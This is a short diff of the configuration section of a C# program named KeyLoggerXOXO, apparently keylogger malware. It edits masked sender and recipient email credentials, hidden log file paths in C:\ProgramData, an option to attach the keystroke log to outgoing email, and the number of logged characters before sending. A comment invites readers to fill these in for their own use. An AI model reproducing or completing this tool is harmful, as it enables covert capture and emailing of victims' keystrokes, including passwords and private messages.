@@ -11,13 +11,13 @@ namespace KeyLoggerXOXO
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "*******************";
-        private const string FROM_EMAIL_PASSWORD = @"****************";
-        private const string TO_EMAIL_ADDRESS = "********************";
+        private const string FROM_EMAIL_ADDRESS = "*";
+        private const string FROM_EMAIL_PASSWORD = @"*";
+        private const string TO_EMAIL_ADDRESS = "*";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
-        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 10;
+        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
 
